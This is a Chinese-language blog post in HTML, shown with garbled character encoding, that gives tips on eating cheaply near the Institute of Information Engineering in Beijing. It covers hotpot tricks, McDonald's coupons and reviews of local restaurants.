    <content type="html"><![CDATA[<p>ğŸ‘´ğŸ’ŠğŸ’°ğŸ§£7âƒ£ğŸœğŸŒ¶ï¼ŒiieğŸ”¥â©ğŸ‘ŠğŸ’°â•ğŸ˜…</p><span id="more"></span><h1 id="æ¬¢è¿æ¥åˆ°æ ‘æ‘è·¯19å·"><a href="#æ¬¢è¿æ¥åˆ°æ ‘æ‘è·¯19å·" class="headerlink" title="æ¬¢è¿æ¥åˆ°æ ‘æ‘è·¯19å·"></a>æ¬¢è¿æ¥åˆ°æ ‘æ‘è·¯19å·</h1><p><img src="https://img.gls.show/img/shucun-road.jpg"></p><p><del>æ„¿åœ£å·¥æ‰€çš„å…‰è¾‰ä¸ä½ åŒåœ¨</del></p><h1 id="æŒ‚é€¼æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ"><a href="#æŒ‚é€¼æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ" class="headerlink" title="æŒ‚é€¼æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ"></a>æŒ‚é€¼æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</h1><blockquote><p>åœ¨æ·±åœ³é¾™åä¸‰å’ŒäººåŠ›å¸‚åœºï¼Œæœ‰è¿™æ ·ä¸€ç¾¤äººï¼Œä»–ä»¬åªåšæ—¥ç»“å·¥ä½œï¼Œåƒç€äº”å…ƒä¸€ç¢—çš„â€œæŒ‚é€¼é¢â€ï¼Œå–ç€ä¸¤å…ƒä¸€å¤§ç“¶çš„â€œæŒ‚é€¼æ°´â€ï¼Œå¹²ä¸€å¤©æ—¥ç»“ï¼Œç©ä¸‰å¤©ï¼Œæ¸¸ç¦»åœ¨ç½‘å§å’Œé›†ä½“å®¿èˆä¹ƒè‡³å¤§è¡—ï¼Œè¿™æ ·çš„ä¸€ç¾¤äººï¼Œè¢«äººä»¬äº²åˆ‡åœ°ç§°ä¸ºâ€œä¸‰å’Œå¤§ç¥â€ã€‚</p></blockquote><blockquote><p>åœ¨ä¸‰å’Œå¤§ç¥ç¾¤ä½“ä¸­ï¼Œâ€œæŒ‚é€¼â€ä¸€è¯æ˜¯ç»å¸¸è¢«æŒ‚åœ¨å˜´è¾¹çš„ã€‚ä¸‰å’Œé’å¹´ä»¬ç»å¸¸å»åƒçš„é¢å› ä¸ºäº”å…ƒä¸€ç¢—ç»æµå®æƒ ï¼Œè¢«ç§°ä¸ºæŒ‚é€¼é¢ï¼›äºŒå…ƒä¸€å¤§ç“¶çš„çº¯å‡€æ°´è¢«ç§°ä¹‹ä¸ºæŒ‚é€¼æ°´ï¼Œâ€œæŒ‚é€¼â€ä¸€è¯æ—¢æ˜¯ä¸€ç§è´¬ä¹‰ï¼Œæ›´å¤šçš„è¿˜æ˜¯ä¸€ç§è‡ªå˜²ã€‚</p></blockquote><p>ä¸‰å’Œå¤§ç¥ç¾¤ä½“æ‰€å½±å°„çš„èººå¹³ä¸»ä¹‰ç­‰ç¤¾ä¼šæ€æ½®æš‚ä¸”ä¸è¡¨ï¼Œæœ¬æ–‡ä»…è®¨è®ºå¦‚ä½•åœ¨åŒ—äº”ç¯è¿™å¯¸åœŸå¯¸é‡‘çš„åœ°æ–¹â€”â€”ä¸­å›½ç§‘å­¦é™¢ä¿¡æ¯å·¥ç¨‹ç ”ç©¶æ‰€ï¼ˆæ ‘æ‘è·¯19å·ï¼‰ï¼Œåƒçš„æ›´å¥½ï¼ˆ<del>æ­£ç¡®çš„æŒ‚é€¼</del>ï¼‰</p><p><img src="https://img.gls.show/img/20230912153023.png"></p><p><img src="https://img.gls.show/img/20230912153036.png"></p><p>ç›¸å…³é˜…è¯»ï¼š</p><ul><li><a href="https://zh.wikipedia.org/wiki/%E4%B8%89%E5%92%8C%E5%A4%A7%E7%A5%9E">ä¸‰å’Œå¤§ç¥ - ç»´åŸºç™¾ç§‘ï¼Œè‡ªç”±çš„ç™¾ç§‘å…¨ä¹¦</a></li><li><a href="https://www.youtube.com/watch?v=YcidornQ7rU">[NHK][çºªå½•ç‰‡][ä¸­æ–‡å­—å¹•] ä¸‰å’Œäººæ‰å¸‚åœºãƒ»ä¸­å›½æ—¥ç»“ç™¾å…ƒçš„é’å¹´ä»¬ - YouTube</a></li></ul><h1 id="æŒ‚é€¼å§¿åŠ¿ï¼Œä¸€ç‚¹æ¥è‡ªé•¿è€…çš„äººç”Ÿç»éªŒã€æŒç»­æ›´æ–°ä¸­ã€‘"><a href="#æŒ‚é€¼å§¿åŠ¿ï¼Œä¸€ç‚¹æ¥è‡ªé•¿è€…çš„äººç”Ÿç»éªŒã€æŒç»­æ›´æ–°ä¸­ã€‘" class="headerlink" title="æŒ‚é€¼å§¿åŠ¿ï¼Œä¸€ç‚¹æ¥è‡ªé•¿è€…çš„äººç”Ÿç»éªŒã€æŒç»­æ›´æ–°ä¸­ã€‘"></a>æŒ‚é€¼å§¿åŠ¿ï¼Œä¸€ç‚¹æ¥è‡ªé•¿è€…çš„äººç”Ÿç»éªŒã€æŒç»­æ›´æ–°ä¸­ã€‘</h1><p>ä¸€ç‚¹æ¥è‡ªé•¿è€…çš„äººç”Ÿç»éªŒï¼šå¦‚ä½•åƒçš„æœ€ä¾¿å®œä»¥åŠæœ€å¥½</p><blockquote><p>åœ¨æœ¬ç« èŠ‚çš„æœ€å¼€å§‹ï¼Œä¸¥é‡å£°æ˜ï¼Œæ²¡æœ‰æ”¶ä»»ä½•å¹¿å‘Šè´¹ï¼Œä¸€åˆ‡éƒ½æ˜¯æ¢åº—å¾—å‡ºçš„ç¾Šæ¯›ï¼ˆæŒ‚é€¼ï¼‰æ”»ç•¥ã€‚å€Ÿç”¨æŸä½é«˜äººçš„åè¨€ï¼šæˆ‘ä»Šå¤©æ˜¯ä½œä¸ºä¸€ä¸ªé•¿è€…ç»™ä½ ä»¬è®²çš„ï¼Œæˆ‘ä¸æ˜¯æ–°é—»å·¥ä½œè€…ï¼Œä½†æ˜¯æˆ‘è§å¾—å¤ªå¤šäº†ï¼Œæˆ‘æœ‰é€™ä¸ªå¿…è¦å‘Šè¯‰ä½ ä»¬ä¸€ç‚¹äººç”Ÿçš„ç»éªŒ</p></blockquote><h1 id="æµ·åº•æ"><a href="#æµ·åº•æ" class="headerlink" title="æµ·åº•æ"></a>æµ·åº•æ</h1><p>æµ·åº•ææœåŠ¡ã€å‘³é“éƒ½æ²¡è¯è¯´ï¼Œå°±æ˜¯æœ‰äº›å¤ªè´µäº†</p><p>è¿™é‡Œæä¾›ä¸€ä¸ªäººå‡45+å—é’±åƒæ’‘çš„åƒæ³•ï¼ˆåªæ¯”ç‚¹å¤–å–å¤šèŠ±äºŒåå—é’±ï¼Œä»æ¥æ²¡å‘ç°æµ·åº•æè¿™ä¹ˆåˆ’ç®—è¿‡ :) ï¼‰ï¼š</p><ul><li><strong>æ— ä¸­ç”Ÿæœ‰ï¼š</strong> ç‚¹ä¸€ä¸ªå››å®«æ ¼ç•ªèŒ„é”…ï¼Œä¸‰ä¸ªæ¸…æ°´é”…ï¼Œç„¶å<strong>ç”¨è¾£é…±è°ƒå‡ºè¾£é”…åº•æ–™</strong>ï¼ŒåŠ åˆ°æ¸…æ°´é”…ä¸­ï¼Œå³å¯å¾—åˆ°<strong>0å…ƒè¾£é”…åº•</strong>ã€‚æ³¨æ„è¿™ä¸ªç•ªèŒ„é”…å°½é‡ä¸è¦ä¸‹èœï¼Œå®ƒæ˜¯ä¸“é—¨ç”¨æ¥å–æ±¤çš„ï¼Œç•ªèŒ„é”…ä¸‹èœä¹‹åå®¹æ˜“å˜å‘³ï¼Œæ±¤ä¼šå˜å¾—ä¸å¥½å–</li><li><strong>æ— æ‡ˆå¯å‡»ï¼š</strong> <ul><li>å–<strong>å…è´¹çš„ç•ªèŒ„ç‰›è‚‰æ±¤</strong>ï¼Œä¸‰ç¢—èµ·æ­¥</li><li>åƒå…è´¹çš„æ°´æœï¼Œäº”ç›˜èµ·æ­¥ï¼ˆç«é¾™æœã€è¥¿ç“œç­‰ï¼‰</li></ul></li><li><strong>æ— æ‰€ä¸åŒ…ï¼š</strong> è¤ç´ æ­é…ï¼Œç‰›ç¾Šè‚‰å·åŠä»½å°±å¾—ä¸‰å››åï¼Œæ¯›è‚šæ›´è´µï¼Œæ²¡å¿…è¦ç‚¹ä¸€å †è¤èœã€‚<strong>é¢æ¡ã€èåœã€è±†çš®æ¶®äº†éƒ½æŒºå¥½åƒçš„</strong></li></ul><p>å†è¯´å‡ ç‚¹ï¼š</p><ul><li>ä¸€å®šè¦æå‰é¢„å®šï¼Œä¸ç„¶çœŸçš„ä¼šæ’å¾ˆä¹…çš„é˜Ÿã€‚æœ‰æ¬¡å·¥ä½œæ—¥å»åƒï¼Œä»¥ä¸ºä¸éœ€è¦æ’é˜Ÿï¼Œç»“æœå¤§ä¸­åˆçš„æ’äº†ä¸€ä¸ªå¤šå°æ—¶</li><li>ç»å¸¸æœ‰ç‰¹ä»·èœå“ï¼Œæ¯”å¦‚9.9çš„ç´ èœï¼Œå¯ä»¥å…³æ³¨ä¸€ä¸‹</li><li>å¦‚æœä½ æå‰é¢„å®šäº†ï¼Œä½†æ˜¯ä½ åˆ°äº†ä¹‹åï¼Œç­‰äº†å‡ åˆ†é’Ÿ(æ¯”å¦‚ä»–ä»¬åœ¨æ‰“æ‰«å«ç”Ÿ)ï¼Œä»–ä»¬å°±ä¼šé€ä½ ä¸€ä¸¤ä¸ªå…è´¹èœå“</li></ul><p><img src="https://img.gls.show/img/202311192051304.png"></p><p><img src="https://img.gls.show/img/202311192050765.png"></p><h1 id="å‰é‡å®¶"><a href="#å‰é‡å®¶" class="headerlink" title="å‰é‡å®¶"></a>å‰é‡å®¶</h1><p>ç¾å›¢ä¸Š19.9ä¸‰ä»¶å¥—æ°¸è¿œç­‰ç€ä½ ï¼Œå¦‚æœæ˜¯æ–°äººï¼Œ19.9çš„äº”ä»¶å¥—ä¹Ÿä¸æ˜¯æ²¡åƒè¿‡</p><p><img src="https://img.gls.show/img/202311192027683.png"></p><p><img src="https://img.gls.show/img/202311192028542.png"></p><p><img src="https://img.gls.show/img/202311192025391.png"></p><h1 id="è€ä¹¡é¸¡"><a href="#è€ä¹¡é¸¡" class="headerlink" title="è€ä¹¡é¸¡"></a>è€ä¹¡é¸¡</h1><p>å•ç‚¹çœŸçš„å¾ˆè´µï¼Œä¹‹å‰åœ¨åˆè‚¥è¯»å¤§å­¦çš„æ—¶å€™ï¼Œå°±è§‰å¾—è€ä¹¡é¸¡å¾ˆè´µï¼Œä¿©äººæ¥ä¸€ä»½é¸¡æ±¤ä¸Šä¿©èœä¿©ç¢—ç±³é¥­å°±ä¸€ç™¾å¤šäº†ï¼Œ<del>æ¯•ç«Ÿé‚£æ—¶å€™è¿˜æ²¡å­¦ä¼šæ­£ç¡®çš„æŒ‚å£å§¿åŠ¿</del></p><p>ç°åœ¨å­¦ä¼šæŒ‚å£ä¹‹åï¼Œç¾å›¢20ä»¥å†…å¯ä»¥åƒä¸‰ä»¶å¥—</p><p><img src="https://img.gls.show/img/202311192042936.png"></p><h1 id="éº¦å½“åŠ³"><a href="#éº¦å½“åŠ³" class="headerlink" title="éº¦å½“åŠ³"></a>éº¦å½“åŠ³</h1><p>å…ˆæ”¾å‡ ä¸ªè®¢å•æˆªå›¾ï¼š</p><p><img src="https://img.gls.show/img/20230917212921.png"></p><p><img src="https://img.gls.show/img/202311062154692.png"></p><h2 id="å¦‚ä½•æ­£ç¡®è–…éº¦å½“åŠ³ç¾Šæ¯›"><a href="#å¦‚ä½•æ­£ç¡®è–…éº¦å½“åŠ³ç¾Šæ¯›" class="headerlink" title="å¦‚ä½•æ­£ç¡®è–…éº¦å½“åŠ³ç¾Šæ¯›"></a><strong>å¦‚ä½•æ­£ç¡®è–…éº¦å½“åŠ³ç¾Šæ¯›</strong></h2><p>1.æ”¯ä»˜å®æœç´¢éº¦å½“åŠ³ï¼Œæ»‘åŠ¨æ¨ªå¹…å¯é¢†åˆ¸ï¼Œæ¯éš”å‡ å¤©å¯ä»¥ç™½å«–ä¸€æ¬¡å…è´¹é¤å“ï¼Œæ¯”å¦‚ä¸­è–¯ã€ä¸€å¯¹é¸¡è…¿/é¸¡ç¿…ã€ä¸­å¯ç­‰ã€‚<strong>å¦‚æœä½ æœ‰å¤šä¸ªæ‰‹æœºå·ç›¸å½“äºå¯ä»¥è¶…çº§åŠ å€ï¼Œç›´æ¥ç™½åƒç™½å–ã€‚</strong> ç¾ä¸­ä¸è¶³çš„æ˜¯æ¯æ¬¡éœ€è¦ä»»æ„æ¶ˆè´¹æ‰èƒ½ç”¨åˆ¸</p><p><img src="https://img.gls.show/img/MergedImages.jpg"></p><p>2.éº¦å½“åŠ³ç¨‹åº-ã€‹ä¼šå‘˜æ—¥-ã€‹é¢†åˆ¸ã€‚ä¸å®šæ—¶ä¼šå‘æ”¾å¾ˆå¤šåˆ¸ï¼Œæ¯æ¬¡çš„æ´»åŠ¨éƒ½ä¸ä¸€æ ·ï¼Œ<strong>å°è±¡ä¸­æ¯”è¾ƒå€¼çš„æ˜¯10å…ƒæ©æ ¼æ–¯ç‰›å ¡/å·¨æ— éœ¸ã€äº”å…ƒæ¿çƒ§ç­‰</strong></p><p>3.æ·˜å®ä»£è®¢ã€‚åœ¨æ·˜å®åº—æ‹ä¸‹ç‰©å“ï¼Œä¹‹åä»–ç»™ä½ ä»£ä¸‹å•ï¼Œä½ æä¾›éº¦å½“åŠ³åº—é“ºåœ°ç‚¹å³å¯ã€‚è¿™ä¸ªæ–¹æ³•æ¯”è¾ƒç»æ´»çš„å•†å“çš„æ˜¯<strong>ä¸€å…ƒé›ªç¢§/å†°çº¢èŒ¶ã€5.8å…ƒçš„ä¸€å¯¹é¸¡ç¿…ã€æ°¸è¿œ10å…ƒçš„æ¿çƒ§/é¦™è¾£é¸¡è…¿å ¡</strong>ï¼Œå…¶ä½™å•†å“ä¹Ÿä¼šæ¯”å®˜æ–¹appä¾¿å®œä¸€äº›</p><p><img src="https://img.gls.show/img/20230917221443.png"></p><h2 id="æ—©é¤"><a href="#æ—©é¤" class="headerlink" title="æ—©é¤"></a>æ—©é¤</h2><p>ä¿¡å·¥æ‰€æ—©é¥­å°±æ˜¯è¡£é‡ä¸çœŸï¼ˆ<del>é‰´å®šä¸ºè¡£é©¼ä½¿</del>ï¼‰ï¼Œæˆ‘æ¯å¤©æ—©é¥­éƒ½æ˜¯å»éº¦å½“åŠ³åƒçš„<br>Tipsï¼š</p><ul><li>èŠ±11.9ä¹°ä¸€ä¸ªæ—©é¤å¡ï¼Œæ—©é¤å¯ä»¥æ‰“6æŠ˜</li><li>è–¯é¥¼å‘³é“ä¸é”™ï¼ŒåŠ ä¸€å…ƒå¯ä»¥æŠŠè–¯é¥¼æ¢æˆé¦™è‚ </li><li>æ—©ä¸Šå¦‚æœå›°å¯ä»¥å–å’–å•¡ï¼Œä¸å›°å¯ä»¥å–è±†æµ†ï¼ˆæˆ‘ä¹Ÿæ˜¯åƒäº†å¥½ä¹…æ‰å‘ç°é¥®æ–™å¯ä»¥æ¢ï¼‰</li><li>æ¨èèœå“<ul><li>åŸå‘³æ¿çƒ§ä¸‰ä»¶å¥—12.6å…ƒ</li><li>çŒªæŸ³éº¦æ»¡åˆ†ä¸‰ä»¶å¥—12å…ƒ</li><li>ç«è…¿æ‰’éº¦ä¸‰ä»¶å¥—10.6</li><li>å¤§è„†é¸¡æ‰’ä¸‰ä»¶å¥—10.6</li></ul></li><li>ä¸æ¨èä»»ä½•è¶…è¿‡15å…ƒçš„éº¦å½“åŠ³æ—©é¤</li></ul><h2 id="éº¦å½“åŠ³èœå“ç‚¹è¯„"><a href="#éº¦å½“åŠ³èœå“ç‚¹è¯„" class="headerlink" title="éº¦å½“åŠ³èœå“ç‚¹è¯„"></a>éº¦å½“åŠ³èœå“ç‚¹è¯„</h2><p><strong>è¾£ç¿…ï¼ˆæœ€è¿‘æœ‰ç»æ´»å¯ä»¥5.94ä¹°ä¿©ï¼‰</strong></p><p>æ˜¯çœŸçš„æœ‰è¾£å‘³çš„è¾£ç¿…ã€‚kfcã€éº¦å½“åŠ³ã€æ±‰å ¡ç‹ã€åè±å£«åå«è¾£ç¿…çš„å¾ˆå¤šï¼Œä½†æ˜¯åªæœ‰éº¦éº¦æ˜¯çœŸæ­£æœ‰è¾£å‘³çš„ï¼Œæ¯”è¾ƒé€‚åˆæˆ‘è¿™ç§å–œæ¬¢è¾£å‘³çš„äººåƒ(ä½†æ˜¯è¿˜æ˜¯ä¸å¤Ÿè¾£ï¼Œå»ºè®®åŠ å¤§è¾£åº¦)ã€‚</p><p>åˆšå‡ºé”…çš„è¾£ç¿…éå¸¸å¥½åƒï¼Œçƒ­ä¹ã€ç¨å¾®æœ‰äº›çƒ«å£ï¼Œå¤–é¢è£¹ç€çš„é¢ç‚¸çš„è„†è„†çš„ï¼Œå°±ç€è‚‰åƒä¸‹å»å¾ˆé¦™</p><h2 id="æ±‰å ¡"><a href="#æ±‰å ¡" class="headerlink" title="æ±‰å ¡"></a>æ±‰å ¡</h2><p><strong>éº¦è¾£é¸¡è…¿å ¡</strong></p><p>å¤–é¢é…¥è„†ï¼Œé‡Œé¢é¸¡è‚‰å¤šæ±ï¼Œæœ‰è¾£å‘³ï¼Œé…åˆæ²™æ‹‰é…±å’Œç”Ÿèœï¼Œå£æ„Ÿå’Œå‘³é“éƒ½å¾ˆä¸é”™ï¼Œæœ‰ä¸€äº›è¾£å‘³</p><p><strong>æ¿çƒ§é¸¡è…¿å ¡</strong></p><p>æ²¹æ²¡æœ‰éº¦è¾£é¸¡è…¿å ¡é‚£ä¹ˆå¤šï¼Œå£æ„Ÿç¬¬ä¸€æµï¼Œä¸€å£å’¬ä¸‹å»æ¾æ¾è½¯è½¯éå¸¸çš„è½»æ¾ï¼Œå‘³é“ä¹Ÿå¾ˆä¸é”™ï¼Œå¯æƒœä¸è¾£</p><p><strong>åŒå‰</strong></p><p>ç‰ˆæœ¬ä¹‹å­ï¼Œæ€§ä»·æ¯”ä¹‹ç‹ï¼Œyydsï¼Œè–„çº±å·¨æ— éœ¸ã€‚æ±‰å ¡å†…å®¹å¾ˆä¸°å¯Œï¼Œé™¤äº†ä¸¤å±‚è´¨é‡å¾ˆä¸é”™çš„ç‰›è‚‰ä¹‹å¤–è¿˜æœ‰ç•ªèŒ„é…±ã€æ²™æ‹‰é…±ã€é…¸é»„ç“œç­‰ç­‰ã€‚<del>å½“å¹´1+1åªè¦11å—é’±çš„æ—¶å€™å¾ˆæµè¡Œä¹°ä¿©1+1æŠŠåŒå‰æ‹¼èµ·æ¥è¶…çº§åŠ å€ä½œä¸ºå››å±‚ç‰›è‚‰æ±‰å ¡é£Ÿç”¨</del></p><p><strong>å·¨æ— éœ¸/å®‰æ ¼æ–¯ç‰›å ¡</strong></p><p>ä¾æ‰˜ç­”è¾©ï¼Œåˆè´µåˆä¸å¥½åƒï¼Œä¸‰å±‚é¢åŒ…å¤¹ä¸¤å—ç‰›è‚‰ï¼Œè¢«åŒå‰çˆ†æ€ï¼ˆä½†æ˜¯æœ‰ä¸€è¯´ä¸€ç‰›è‚‰è´¨é‡è¿˜æ˜¯ä¸é”™çš„ï¼Œå’ŒåŒå‰å·®ä¸å¤šï¼‰</p><h1 id="æå…ˆç”Ÿ"><a href="#æå…ˆç”Ÿ" class="headerlink" title="æå…ˆç”Ÿ"></a>æå…ˆç”Ÿ</h1><p>ä½äºä¸Šåœ°å¥½åˆ©æ¥æ—è¾¹ï¼ˆæ²¡é”™å°±æ˜¯é‚£ä¸ªTå­—è·¯å£ï¼‰ï¼Œäººå‡20å—é’±çš„ä¸‰ä»¶å¥—ï¼š</p><p><img src="https://img.gls.show/img/202311192043714.png"></p><h1 id="é±¼ä½ åœ¨ä¸€èµ·"><a href="#é±¼ä½ åœ¨ä¸€èµ·" class="headerlink" title="é±¼ä½ åœ¨ä¸€èµ·"></a>é±¼ä½ åœ¨ä¸€èµ·</h1><p>äººå‡30çš„å¤–å–ï¼Œç±³å¾ˆé¦™ï¼Œå¤–å–åŒ…è£…å¾ˆå¥½ï¼Œé±¼å¾ˆå¥½åƒ</p><p><img src="https://img.gls.show/img/202311192047866.png"></p><h1 id="æµ·ç›—è™¾é¥­"><a href="#æµ·ç›—è™¾é¥­" class="headerlink" title="æµ·ç›—è™¾é¥­"></a>æµ·ç›—è™¾é¥­</h1><p>äººå‡25çš„å¤–å–ï¼Œå‘³é“è¿˜ä¸é”™</p><p><img src="https://img.gls.show/img/202311192058672.png"></p><h1 id="è¨è‰äºš"><a href="#è¨è‰äºš" class="headerlink" title="è¨è‰äºš"></a>è¨è‰äºš</h1><blockquote><p>è¥¿é¤ç•Œçš„æ²™å¿å°åƒï¼Œä¿¡å·¥æ‰€ä¸‰é£Ÿå ‚ï¼Œä½äºä¸Šåœ°å•†åœºï¼Œä»·æ ¼å®æƒ </p></blockquote><p>æµ·é²œæŒ‚é€¼é¢åªè¦14</p><p><img src="https://img.gls.show/img/202311192047685.png"></p><h1 id="è¾¾ç¾ä¹æŠ«è¨"><a href="#è¾¾ç¾ä¹æŠ«è¨" class="headerlink" title="è¾¾ç¾ä¹æŠ«è¨"></a>è¾¾ç¾ä¹æŠ«è¨</h1><blockquote><p>åœ£å‘¨äºŒï¼Œåœ£å‘¨ä¸‰ï¼Œè¾¾ç¾ä¹çš„å…‰è¾‰æ’­æ’’äººé—´ã€‚ä¿¡å·¥æ‰€ä¸‰é£Ÿå ‚ï¼Œä½äºä¸Šåœ°å•†åœº</p></blockquote><p>å‘¨äºŒå‘¨ä¸‰è¾¾ç¾ä¹æŠ«è¨ä¸ƒæŠ˜ï¼Œå¹¶ä¸”æ¯æ¬¡åƒå®Œè¾¾ç¾ä¹éƒ½å¯ä»¥æŠ½å¥–ï¼Œæœ€æ¬¡ä¹Ÿèƒ½æŠ½åˆ°ä¸€ä¸ªé¥®æ–™ï¼Œå¥½ç‚¹å°±æ˜¯è›‹æŒå’Œçƒ¤ä¸²ï¼ŒæŒ‰ç…§æœ€ä¾¿å®œçš„æŠ«è¨40å—é’±ç®—ï¼Œä¸€é¡¿é¥­28å¯ä»¥åƒçš„å¾ˆå¥½</p><ul><li>åªæ¨èå‘¨äºŒå‘¨ä¸‰å»åƒï¼Œå¯Œå“¥éšæ„</li><li>æ¨èå£å‘³<ul><li>å¾·å…‹è¨æ–¯çƒ¤è‚‰ 27.3</li><li>ç»å…¸æ„è¯†è‚‰é…± 27.3</li><li>ç…§çƒ§ç‰›è‚‰æŠ«è¨</li></ul></li></ul><p><img src="https://img.gls.show/img/202311192054147.png"></p><h1 id="ä¸€æ—©ä¸€æ™š"><a href="#ä¸€æ—©ä¸€æ™š" class="headerlink" title="ä¸€æ—©ä¸€æ™š"></a>ä¸€æ—©ä¸€æ™š</h1><p>éº¦å½“åŠ³æ—è¾¹çš„ä¸€å®¶é¢é¦†ï¼Œæœ‰æ—©é¤ï¼Œæœ‰å¤–å–ï¼Œæœ‰å ‚é£Ÿ</p><p>æ€§ä»·æ¯”é€‰æ‹©æ˜¯16å—é’±çš„æŒ‚é€¼æ‹Œé¢ï¼Œé‡å¤§ç®¡é¥±</p><p>ç‰›è‚‰é¢ï¼ˆ22ï¼‰ï¼š<br><img src="https://img.gls.show/img/202311192052987.png"></p><h1 id="åè±å£«"><a href="#åè±å£«" class="headerlink" title="åè±å£«"></a>åè±å£«</h1><blockquote><p>å¤–å–</p></blockquote><p><del>å–·å°„æˆ˜å£«</del> å¯èƒ½åªæ˜¯ç©æ¢—ï¼Œæˆ‘å€’æ˜¯æ²¡é‡åˆ°è¿‡</p><p>15å—é’±å¯ä»¥ç‚¹ä¸‰ä¸ªä¸»é£Ÿï¼Œè¿˜æ˜¯å¾ˆä¸é”™çš„</p><h1 id="é“é“è¾¹çƒ§çƒ¤"><a href="#é“é“è¾¹çƒ§çƒ¤" class="headerlink" title="é“é“è¾¹çƒ§çƒ¤"></a>é“é“è¾¹çƒ§çƒ¤</h1><p>ä½äºäº”é“å£ï¼Œäººå‡60+çš„çƒ¤è‚‰ï¼Œé‡å¤§ç®¡é¥±å‘³é“å¥½ï¼Œ128çš„å¥—é¤æœ‰å¥½å‡ ä»½çƒ¤è‚‰ã€é‡‘æªé±¼æ‹Œé¥­ã€å¥½å‡ ä»½ç´ èœï¼Œæ ¹æœ¬åƒä¸å®Œ</p><p><img src="https://img.gls.show/img/202311192109784.png">****</p><h1 id="éº»å…­è®°"><a href="#éº»å…­è®°" class="headerlink" title="éº»å…­è®°"></a>éº»å…­è®°</h1><p>ä½äºæ¸…æ²³ä¸‡è±¡æ±‡äº”æ¥¼ï¼Œé€‚åˆçˆ±åƒè¾£çš„äººã€‚88ä¸€ä»½çš„æ‹›ç‰Œè¾£é”…åŒ…ç½—ä¸‡è±¡ï¼ŒåŒ…æ‹¬ä½†æ˜¯ä¸é™äºè‚¥è‚ ã€é³é±¼ã€é¸­è¡€ã€å°é…¥è‚‰ç­‰ç­‰ï¼Œå¤Ÿä¸¤ä¸ªäººåƒé¥±äº†</p><p>æ­¤å¤–ï¼Œæ­¤åº—å¥½è¯„é€å†°ç²‰ã€ç³–è‘«èŠ¦</p><p><img src="https://img.gls.show/img/202311192101705.png"></p><h1 id="æ½®æ±•ç‰›è‚‰ç«é”…"><a href="#æ½®æ±•ç‰›è‚‰ç«é”…" class="headerlink" title="æ½®æ±•ç‰›è‚‰ç«é”…"></a>æ½®æ±•ç‰›è‚‰ç«é”…</h1><p>äººå‡ä¸€ç™¾å…­ï¼Œå¯Œäººçš„é€‰æ‹©ã€‚ç¯å¢ƒä¸€èˆ¬ï¼ŒæœåŠ¡ä¸€èˆ¬ï¼Œä½†æ˜¯è‚‰ç¡®å®æ–°é²œï¼Œå¯ä»¥åƒç‰›è‚‰åƒåˆ°çˆ½</p><p><img src="https://img.gls.show/img/202311192032125.png"></p><h1 id="å¾ˆä¹…ä»¥å‰ç¾Šè‚‰ä¸²"><a href="#å¾ˆä¹…ä»¥å‰ç¾Šè‚‰ä¸²" class="headerlink" title="å¾ˆä¹…ä»¥å‰ç¾Šè‚‰ä¸²"></a>å¾ˆä¹…ä»¥å‰ç¾Šè‚‰ä¸²</h1><blockquote><p>ä½äºä¸Šåœ°è´Ÿä¸€æ¥¼</p></blockquote><p>äººå‡100ï¼Œå±äºé™„è¿‘æœ€é«˜æ°´å¹³çš„çƒ§çƒ¤åº—ï¼Œå«ç”Ÿæ¡ä»¶å’ŒæœåŠ¡æ€åº¦ä¹Ÿä¸é”™<br><img src="https://img.gls.show/img/202311192045545.png"></p><p><img src="https://img.gls.show/img/202311192045284.png"></p><p><img src="https://img.gls.show/img/202311192031383.png"></p><h1 id="ä¿„ç½—æ–¯é¤å…"><a href="#ä¿„ç½—æ–¯é¤å…" class="headerlink" title="ä¿„ç½—æ–¯é¤å…"></a>ä¿„ç½—æ–¯é¤å…</h1><blockquote><p>ä½äºä¸­å…³æ‘</p></blockquote><p>äººå‡100+ï¼Œè£…ä¿®è¿˜ä¸é”™ï¼Œä½†æ˜¯æ„Ÿè§‰ä¸ç¬¦åˆä¸­å›½äººå£å‘³ï¼Œ<del>åˆå¤§åˆç²—çš„é¢åŒ…è˜¸ç•ªèŒ„é…±èƒ½åšä¸»é£Ÿä½ æ•¢ä¿¡</del>ã€‚æƒ³å°é²œçš„å¯ä»¥è€ƒè™‘ä¸€ä¸‹</p><p>![[Pasted image 20231119203905.png]]<br><img src="https://img.gls.show/img/202311192038072.png"></p><p><img src="https://img.gls.show/img/202311192037458.png"></p><h1 id="æ­¦åœ£ç¾Šæ±¤"><a href="#æ­¦åœ£ç¾Šæ±¤" class="headerlink" title="æ­¦åœ£ç¾Šæ±¤"></a>æ­¦åœ£ç¾Šæ±¤</h1><blockquote><p>åˆ†åº—ä¼—å¤šï¼Œæœ€è¿‘çš„ä¸€å®¶åœ¨é‡‘éš…å˜‰å</p></blockquote><p>äººå‡25ï¼Œç¾Šè‚‰æ±¤åˆ†é‡è¶³ï¼Œæœ‰ç¾Šè‚‰å‘³ï¼ˆä»€ä¹ˆæ—¶å€™å¼€å§‹è¿™ä¸ªä¹Ÿæ˜¯è¤’ä¹‰è¯äº†qwqï¼‰</p><p><img src="https://img.gls.show/img/202311192034509.png"></p><h1 id="çŠŸéª¨å¤´"><a href="#çŠŸéª¨å¤´" class="headerlink" title="çŠŸéª¨å¤´"></a>çŠŸéª¨å¤´</h1><blockquote><p>ä½äºé‡‘éš…å˜‰å</p></blockquote><p>èŠå£«é‡‘éš…å˜‰åï¼š</p><p><img src="https://img.gls.show/img/202311192041423.png"></p><p>äººå‡20ï¼Œé€é¥®æ–™ï¼Œè‚‰å¤šçš„æ ¹æœ¬åƒä¸å®Œ</p><p><img src="https://img.gls.show/img/202311192035259.png"></p><h1 id="ç»¿èŒ¶é¤å…"><a href="#ç»¿èŒ¶é¤å…" class="headerlink" title="ç»¿èŒ¶é¤å…"></a>ç»¿èŒ¶é¤å…</h1><blockquote><p>åˆ†åº—ä¼—å¤šï¼Œæœ€è¿‘çš„ä¸€å®¶åœ¨ä¸Šåœ°</p></blockquote><p>äººå‡60å·¦å³ï¼Œå±äºå—æ–¹èœç³»ï¼Œåæ¸…æ·¡</p><p>æ¨èèœï¼š</p><ul><li>çƒ§é¸¡</li><li>å†°æ¿€å‡Œé¢åŒ…</li><li>ç±³é…’</li></ul><p><img src="https://img.gls.show/img/202311192112795.png"></p><p><img src="https://img.gls.show/img/202311192108740.png"></p><h1 id="å˜‰å’Œä¸€å“ç²¥"><a href="#å˜‰å’Œä¸€å“ç²¥" class="headerlink" 